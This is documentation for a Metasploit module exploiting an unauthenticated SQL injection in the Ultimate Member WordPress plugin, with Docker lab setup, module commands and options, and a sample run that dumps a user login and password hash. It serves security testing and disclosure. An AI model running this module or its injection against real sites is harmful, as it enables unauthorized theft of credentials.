## Vulnerable Application

The vulnerability affects the **Ultimate Member** plugin for WordPress, versions
**2.1.3 to 2.8.2**, allowing **unauthenticated SQL injection** (unauth SQLi) via
the `sorting` parameter.
This plugin has over **200,000 active installations**, making this a significant security issue.

### Pre-requisites:
   - **Docker** and **Docker Compose** installed on your system.

### Setup Instructions:

1. **Download the Docker Compose file**:
   - Here is the content of the **docker-compose.yml** file to set up WordPress
   with the vulnerable Ultimate Member plugin and a MySQL database.

```yaml
version: '3.1'

services:
  wordpress:
    image: wordpress:latest
    restart: always
    ports:
      - 5555:80
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: chocapikk
      WORDPRESS_DB_PASSWORD: dummy_password
      WORDPRESS_DB_NAME: exploit_market
    mem_limit: 512m
    volumes:
      - wordpress:/var/www/html

  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: exploit_market
      MYSQL_USER: chocapikk
      MYSQL_PASSWORD: dummy_password
      MYSQL_RANDOM_ROOT_PASSWORD: '1'
    volumes:
      - db:/var/lib/mysql

volumes:
  wordpress:
  db:
```

2. **Start the Docker environment**:
   - In the directory where you saved the `docker-compose.yml` file, run the following command to start the services:

```bash
docker-compose up -d
```

3. **Install Ultimate Member Plugin**:
   - Download the vulnerable version of the Ultimate Member plugin:

```bash
wget https://downloads.wordpress.org/plugin/ultimate-member.2.8.2.zip
```

   - Install the plugin in your running WordPress instance:
     - Extract the plugin files and copy them to your WordPress container:

```bash
unzip ultimate-member.2.8.2.zip
docker cp ultimate-member wordpress:/var/www/html/wp-content/plugins/
```

   - Navigate to `http://localhost:5555/wp-admin` in your browser and activate the **Ultimate Member** plugin in the WordPress admin panel.

4. **Enable Custom Account Metadata Table**:
   - Navigate to `http://localhost:5555/wp-admin/admin.php?page=um_options&tab=misc`
   and enable the **Use a custom table for account metadata** option.

## Verification Steps

1. **Set up WordPress** with the vulnerable **Ultimate Member 2.8.2** plugin.
2. **Start Metasploit** using the command `msfconsole`.
3. Use the correct module for the vulnerability:

```bash
   use auxiliary/scanner/http/wp_ultimate_member_sorting_sqli
```

4. Set the target's IP and URI:

```bash
   set RHOST <target_ip>
   set TARGETURI /
```

5. **Run the module**:

```bash
   run
```

6. **Verify the SQL Injection**:
   - After running the module, the SQL injection payload will attempt to retrieve or manipulate data from the WordPress database.

## Options

### DIR_ID_MIN and DIR_ID_MAX
These options specify the range of `directory_id` values used to bruteforce the ID during the SQL injection attack.
By default, they are set from 1 to 100, but you can adjust this range based on your target.

### COUNT
This option specifies the number of rows to retrieve from the database during the SQL injection attack.
For example, setting `COUNT` to 5 will retrieve 5 rows from the `wp_users` table.

### PAGE_ID_MIN and PAGE_ID_MAX
These options specify the range of `page_id` values used to locate the pages containing the nonce required for the SQL injection.
By default, they are set from 1 to 20, but you can adjust this range based on your target.

## Scenarios

The following scenario demonstrates an SQL injection attack against a WordPress
installation running **Ultimate Member 2.8.2** on a Docker environment with MySQL.

### Step-by-step Scenario

```bash
msf6 auxiliary(scanner/http/wp_ultimate_member_sorting_sqli) > run http://127.0.0.1:5555

[*] Performing SQL injection for CVE-2024-1071 via the 'sorting' parameter...
[*] Getting nonce...
[+] Nonce retrieved: 1ab37a3d8f
[*] Searching for valid directory id between 1 and 100...
[+] Valid directory ID found: b9238 (tested with 1)
[*] {SQLi} Executing (select group_concat(VTKTaFWa) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) VTKTaFWa from wp_users limit 1) Dc)
[*] {SQLi} Encoded to (select group_concat(VTKTaFWa) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0xfb,0)),ifnull(user_pass,repeat(0x20,0))) as binary) VTKTaFWa from wp_users limit 1) Dc)
[*] {SQLi} Time-based injection: expecting output of length 44
[+] Dumped user data:
wp_users
========

    user_login  user_pass
    ----------  ---------
    chocapikk   $P$BPdY0XccQT2nvSXE8bjsn1CERoF7eJ.

[+] Loot saved to: /home/chocapikk/.msf4/loot/20240922050825_default_127.0.0.1_wordpress.users_421054.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
